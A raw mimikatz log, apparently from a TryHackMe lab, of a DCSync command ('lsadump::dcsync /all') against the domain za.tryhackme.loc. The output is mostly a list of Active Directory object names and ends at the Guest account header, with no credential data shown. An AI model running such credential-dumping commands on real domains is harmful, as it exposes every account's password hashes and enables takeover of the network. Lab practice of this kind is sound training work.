Using 'lorraine.gill_dcdump.txt' for logfile : OK

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] Exporting domain 'za.tryhackme.loc'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : za


Object RDN           : LostAndFound


Object RDN           : Deleted Objects


Object RDN           : Users


Object RDN           : Computers


Object RDN           : System


Object RDN           : WinsockServices


Object RDN           : RpcServices


Object RDN           : FileLinks


Object RDN           : VolumeTable


Object RDN           : ObjectMoveTable


Object RDN           : Default Domain Policy


Object RDN           : AppCategories


Object RDN           : Meetings


Object RDN           : Policies


Object RDN           : User


Object RDN           : Machine


Object RDN           : {6AC1786C-016F-11D2-945F-00C04fB984F9}


Object RDN           : User


Object RDN           : Machine


Object RDN           : RAS and IAS Servers Access Check


Object RDN           : File Replication Service


Object RDN           : Dfs-Configuration


Object RDN           : IP Security


Object RDN           : ipsecPolicy{72385230-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385231-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{72385232-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BE2-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{594272E2-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecPolicy{72385236-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{72385237-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319C04-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecPolicy{7238523C-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecISAKMPPolicy{7238523D-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{7238523E-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNFA{59319BF3-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNFA{6A1F5C6F-72B7-11D2-ACF0-0060B0ECCA17}


Object RDN           : ipsecNFA{594272FD-071D-11D3-AD22-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BDF-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319BF0-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{59319C01-5EE3-11D2-ACE8-0060B0ECCA17}


Object RDN           : ipsecNegotiationPolicy{72385233-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523F-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecNegotiationPolicy{7238523B-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{7238523A-70FA-11D1-864C-14A300000000}


Object RDN           : ipsecFilter{72385235-70FA-11D1-864C-14A300000000}


Object RDN           : ComPartitions


Object RDN           : ComPartitionSets


Object RDN           : WMIPolicy


Object RDN           : PolicyTemplate


Object RDN           : SOM


Object RDN           : PolicyType


Object RDN           : WMIGPO


Object RDN           : DomainUpdates


Object RDN           : Operations


Object RDN           : ab402345-d3c3-455d-9ff7-40268a1099b6


Object RDN           : bab5f54d-06c8-48de-9b87-d78b796564e4


Object RDN           : f3dd09dd-25e8-4f9c-85df-12d6d2f2f2f5


Object RDN           : 2416c60a-fe15-4d7a-a61e-dffd5df864d3


Object RDN           : 7868d4c8-ac41-4e05-b401-776280e8e9f1


Object RDN           : 860c36ed-5241-4c62-a18b-cf6ff9994173


Object RDN           : 0e660ea3-8a5e-4495-9ad7-ca1bd4638f9e


Object RDN           : a86fe12a-0f62-4e2a-b271-d27f601f8182


Object RDN           : d85c0bfd-094f-4cad-a2b5-82ac9268475d


Object RDN           : 6ada9ff7-c9df-45c1-908e-9fef2fab008a


Object RDN           : 10b3ad2a-6883-4fa7-90fc-6377cbdc1b26


Object RDN           : 98de1d3e-6611-443b-8b4e-f4337f1ded0b


Object RDN           : f607fd87-80cf-45e2-890b-6cf97ec0e284


Object RDN           : 9cac1f66-2167-47ad-a472-2a13251310e4


Object RDN           : 6ff880d6-11e7-4ed1-a20f-aac45da48650


Object RDN           : 446f24ea-cfd5-4c52-8346-96e170bcb912


Object RDN           : 51cba88b-99cf-4e16-bef2-c427b38d0767


Object RDN           : a3dac986-80e7-4e59-a059-54cb1ab43cb9


Object RDN           : 293f0798-ea5c-4455-9f5d-45f33a30703b


Object RDN           : 5c82b233-75fc-41b3-ac71-c69592e6bf15


Object RDN           : 7ffef925-405b-440a-8d58-35e8cd6e98c3


Object RDN           : 4dfbb973-8a62-4310-a90c-776e00f83222


Object RDN           : 8437C3D8-7689-4200-BF38-79E4AC33DFA0


Object RDN           : 7cfb016c-4f87-4406-8166-bd9df943947f


Object RDN           : f7ed4553-d82b-49ef-a839-2f38a36bb069


Object RDN           : 8ca38317-13a4-4bd4-806f-ebed6acb5d0c


Object RDN           : 3c784009-1f57-4e2a-9b04-6915c9e71961


Object RDN           : 6bcd5678-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5679-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567d-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567e-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd567f-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5680-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5681-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5682-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5683-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5684-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5685-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5686-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5687-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5688-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd5689-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568a-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568b-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568c-8314-11d6-977b-00c04f613221


Object RDN           : 6bcd568d-8314-11d6-977b-00c04f613221


Object RDN           : 3051c66f-b332-4a73-9a20-2d6a7d6e6a1c


Object RDN           : 3e4f4182-ac5d-4378-b760-0eab2de593e2


Object RDN           : c4f17608-e611-11d6-9793-00c04f613221


Object RDN           : 13d15cf0-e6c8-11d6-9793-00c04f613221


Object RDN           : 8ddf6913-1c7b-4c59-a5af-b9ca3b3d2c4c


Object RDN           : dda1d01d-4bd7-4c49-a184-46f9241b560e


Object RDN           : a1789bfb-e0a2-4739-8cc0-e77d892d080a


Object RDN           : 61b34cb0-55ee-4be9-b595-97810b92b017


Object RDN           : 57428d75-bef7-43e1-938b-2e749f5a8d56


Object RDN           : ebad865a-d649-416f-9922-456b53bbb5b8


Object RDN           : 0b7fb422-3609-4587-8c2e-94b10f67d1bf


Object RDN           : 2951353e-d102-4ea5-906c-54247eeec741


Object RDN           : 71482d49-8870-4cb3-a438-b6fc9ec35d70


Object RDN           : aed72870-bf16-4788-8ac7-22299c8207f1


Object RDN           : f58300d1-b71a-4DB6-88a1-a8b9538beaca


Object RDN           : 231fb90b-c92a-40c9-9379-bacfc313a3e3


Object RDN           : 4aaabc3a-c416-4b9c-a6bb-4b453ab1c1f0


Object RDN           : 9738c400-7795-4d6e-b19d-c16cd6486166


Object RDN           : de10d491-909f-4fb0-9abb-4b7865c0fe80


Object RDN           : b96ed344-545a-4172-aa0c-68118202f125


Object RDN           : 4c93ad42-178a-4275-8600-16811d28f3aa


Object RDN           : c88227bc-fcca-4b58-8d8a-cd3d64528a02


Object RDN           : 5e1574f6-55df-493e-a671-aaeffca6a100


Object RDN           : d262aae8-41f7-48ed-9f35-56bbb677573d


Object RDN           : 82112ba0-7e4c-4a44-89d9-d46c9612bf91


Object RDN           : c3c927a6-cc1d-47c0-966b-be8f9b63d991


Object RDN           : 54afcfb9-637a-4251-9f47-4d50e7021211


Object RDN           : f4728883-84dd-483c-9897-274f2ebcf11e


Object RDN           : ff4f9d27-7157-4cb0-80a9-5d6f2b14c8ff


Object RDN           : 83C53DA7-427E-47A4-A07A-A324598B88F7


Object RDN           : C81FC9CC-0130-4FD1-B272-634D74818133


Object RDN           : E5F9E791-D96D-4FC9-93C9-D53E1DC439BA


Object RDN           : e6d5fd00-385d-4e65-b02d-9da3493ed850


Object RDN           : 3a6b3fbf-3168-4312-a10d-dd5b3393952d


Object RDN           : 7F950403-0AB3-47F9-9730-5D7B0269F9BD


Object RDN           : 434bb40d-dbc9-4fe7-81d4-d57229f7b080


Object RDN           : A0C238BA-9E30-4EE6-80A6-43F731E9A5CD


Object RDN           : Windows2003Update


Object RDN           : ActiveDirectoryUpdate


Object RDN           : Password Settings Container


Object RDN           : PSPs


Object RDN           : Domain Controllers


Object RDN           : Infrastructure


Object RDN           : ForeignSecurityPrincipals


Object RDN           : Program Data


Object RDN           : Microsoft


Object RDN           : NTDS Quotas


Object RDN           : Managed Service Accounts


Object RDN           : TPM Devices


Object RDN           : Keys


Object RDN           : Guest

** SAM ACCOUNT **

